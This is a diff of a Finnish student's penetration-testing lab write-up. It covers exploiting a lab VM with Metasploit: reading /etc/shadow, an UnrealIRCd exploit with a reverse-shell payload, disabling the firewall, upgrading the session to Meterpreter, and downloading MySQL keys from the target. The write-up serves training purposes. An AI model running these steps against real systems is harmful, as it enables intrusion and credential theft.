@@ -217,8 +217,11 @@ Myös sessio ID on oikein
 
 ![kuva](https://github.com/user-attachments/assets/c9e68e06-187c-441a-9732-29f6cfc0ac23)
 
-
 Päätin jatkaa eteenpäin. Yritän katsoa myöhemmässä tehtävässä jonkin valmiin MeterPreter payloadin omaavan tiedoston, jotta pystyn näyttämään sen ominaisuuksia.
+
+## Päivitys 14:10
+
+Meterpreterin ylennys onnistuu vihdoin kohdassa j). Ongelmana oli palomuuri, joka esti yhteyden muodostamisen.
 
 # i)
 
@@ -228,6 +231,8 @@ Hain ensin kaikki salasanojen tiivisteet komennolla 'cat /etc/shadow'
 
 Näitä salasanoja käyttämällä voi saada murrettua muiden käyttäjien salasanoja ja sitä kautta mahdollisesti uusia käyttöoikeuksia eri palveluihin.
 Salasan tiivistefunktio saadaan $1$ alkuisista tiivisteistä. Koko tiiviste koostuu seuraavista osista "$id$salt$encrypted" eli ensimmäinen osa on ID joka kertoo tiivisteen olevan muotoa MD5, seuraava suola arvo ja viimeisenä salattu salasana.
+
+(https://security.stackexchange.com/questions/92149/what-are-hashes-that-begin-with-1)
 
 Seuraavaksi tutkin mitä tiedostoja koneella olisi.
 
@@ -256,6 +261,8 @@ Tätä ei ehkä voi käyttää lateraaliseen liikkumiseen, mutta tästä saan se
 
 # j) Muratudu toisella tapaa
 
+## Ensimmäinen yritys
+
 Katsoin auki olevia palveluita ja päätin yrittää Sambaa.
 Hain komennolla 'search Samba 3.0.20' koska se näkyi versioissa ja löysin haavoittuvuuden
 
@@ -273,6 +280,103 @@ Sain vain vastaukseski, että exploit complete, no session was created.
 
 Päätin käynnistää molemmat koneet uudelleen.
 
+Tein kaiken uudelleen ja yritin komentoa uudestaan. Sain saman virheen.
+
+![kuva](https://github.com/user-attachments/assets/c78e348a-056e-4154-9022-8485bd648b9e)
+
+## Toinen yritys
+
+Päätin tääs vaiheessa käyttää ohjeena Tuomas Valkamon tehtävän ratkaisua ohjeena.
+
+Päätin kohteeksi UnrealIRCd ohjeen mukaan.
+
+Sain totutusti haettua itse haavoittuvuuden ja koatsottua sen asetukset sekä lisättyä RHOSTIN.
+
+![kuva](https://github.com/user-attachments/assets/8f3998b9-f9e8-49dd-af05-28481753f2c3)
+
+Ajaessa kuitenkin tuli ongelma, että payloadia ei ollut valittu.
+
+Katsoin T. Valkamon ohjeesta tavan katsoa payloadit sekä suosituksen valinnasta, sekä rapid7 sivulta komennon muokata payloadia. (https://tuomasvalkamo.com/PenTestCourse/week-2/), (https://docs.rapid7.com/metasploit/working-with-payloads/)
+
+Katsoin payloadit komennolla 'show payloads' ja valitsin payloadin payload/cmd/unix/reverse komennolla 'setpayload 6'
+
+Tämän jälkeen ajoin komennon, mutta sain virheen LHOSTin puutteesta. Se oli tullut nyt payloadin valintana uutena.
+
+![kuva](https://github.com/user-attachments/assets/63945462-ede7-41d0-8173-2a77daf2917f)
+
+Asetin LHOSTin komennolla 'set LHOST 192.168.56.104'
+
+Sain virheen ja verenpaine alkoi nousemaan.
+
+![kuva](https://github.com/user-attachments/assets/e87c5fc2-95fb-4f3a-a7c4-a3eb4aa8f6e1)
+
+Ohjetta siis käytännössä tarvitsin vain kohteen ja payloadin valintaan.
+
+## Palomuuri pois ja kolmas yritys
+
+Tässä vaiheessa aloin miettimään, että voiko ongelmani johtua palomuurista, joka estää portit joista yritän saada yhteyden.
+
+Sammutin palomuurin komennolla 'sudo systemctl stop ufw'
+
+Tämän jälkeen ajoin metasploitin komennon 'exploit' uudelleen.
+
+![kuva](https://github.com/user-attachments/assets/aa5860b4-f00b-41e5-a99e-256c5146a88e)
+
+Olin vihdoin sisällä. Parin tunnin pään hakkaaminen seinään oli tullut päätökseen. Ajattelin, että jos vielä session ylentäminen onnistuu, niin olen kyllä onneni huipulla.
+Totesin myös, että komento jolla saa käyttöliittymän mukavammaksi on 'shell'
+
+Kädet vapisten kirjoitin komennon 'session -u 1'
+
+![kuva](https://github.com/user-attachments/assets/afdcbc79-744b-47f4-8973-f79a72db5ae8)
+
+Sain virheen, mutta päätin yrittää päästä vsftpd yhteyden kautta ylentämään.
+
+Tein siis saman kuin aiemmassa kohdassa.
+
+![kuva](https://github.com/user-attachments/assets/e41add5d-331b-486a-8409-c4e7e8028a7d)
+
+Se oli siellä! Tyhmästä päästä kärsi koko kroppa jälleen.
+
+
+
+# k) Meterpreterin ominaisuudet
+
+![kuva](https://github.com/user-attachments/assets/32d1a06c-aafe-4667-8a4f-7268708948c1)
+
+En saanut Meterpreter sessiota näkymään, vaikka se tulosteen mukaan pitäisikin toimia.
+Muistan luennolla nähneeni, että sessiot pitäisi näkyä erikseen. En löytänyt aiheesta mitään ohjetta, muuta kuin loputtomia vastauksettomia foorumikeskusteluja. En löytänyt tähän ongelmaan ratkaisua.
+
+3.11.2024 klo 13:48
+
+Jatkuu tästä, nyt sain session toimimaan.
+
+Löysin komennoista selkeämmän listauksen meterpreterin help komennon tueksi (https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
+
+Ensimmäisenä silmääni iski download ja upload komennot
+
+Päätin näistä kokeilla downloadia ja latasin koko aiemmin löytämäni SQL avain kokoelman komennolla 'download mysql-keys/'
+
+![kuva](https://github.com/user-attachments/assets/e909db9e-7856-4880-808b-ea61f32c97ec)
+
+Näkyvät myös kansioissa.
+
+![kuva](https://github.com/user-attachments/assets/59f1b5ae-d328-44f8-a453-f624d844dd16)
+
+Tarkastin myös, että muokkauspäivä ei ole näissä muuttunut.
+
+Halusin koettaa 'upload' komentoa seuraavaksi
+
+Ajoin komennon 'upload foo.xml'
+
+![kuva](https://github.com/user-attachments/assets/67ad5ca2-4b99-44ce-a8ac-d4186b6efbd1)
+
+Tiedosto ilmestyi näkyviin.
+
+Muuten meterpreterillä saa täyden hallinnan kohdelaitteen tiedostoihin, verkkoon sekä prosesseihin. Tämän lisäksi voidaan hallita esimerkiksi laitteen kameraa ja mikrofonia.
+Ylipäärään ohjelma, jota en koneelleni haluaisi.
+
+
+
 # l) Tallenna scriptillä
 
 Ajoin ohjeessa olleen komennon script -fa log001.txt ja totesin sen tallentavan kaiken, mitä terminaalissa tekee, myös metasploitin sisällä.
@@ -283,51 +387,13 @@ Ajoin ohjeessa olleen komennon script -fa log001.txt ja totesin sen tallentavan 
 
 Tämä on varmasti kätevä omien tekojen ja jälkien seuraamiseen. Scriptin sai suljettua komennolla 'exit'.
 
+Tätä työkalua pitää käyttää jatkossa, jotta myös tulosteet jäävät sessioiden välillä olemaan.
 
+# Lähteet:
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+1. T. Karvinen, 2024, Tunkeutumistestaus, https://terokarvinen.com/tunkeutumistestaus/, luettu 3.11.2024
+2. 'man nmap', Luettu 3.11.2024
+3. StackExchange, 2015, What are hashes that begin with $1$...?, https://security.stackexchange.com/questions/92149/what-are-hashes-that-begin-with-1, luettu 3.11.2024
+4. T. Valkamo, 2022, Hacking into a Target Using Metasploit, https://tuomasvalkamo.com/PenTestCourse/week-2/, Luettu 3.11.2024
+5. Rapid7, Working with Payloads, https://docs.rapid7.com/metasploit/working-with-payloads/, Luettu 3.11.2024
+6. OffSec, Meterpreter Basics, https://www.offsec.com/metasploit-unleashed/meterpreter-basics/, Luettu 3.11.2024
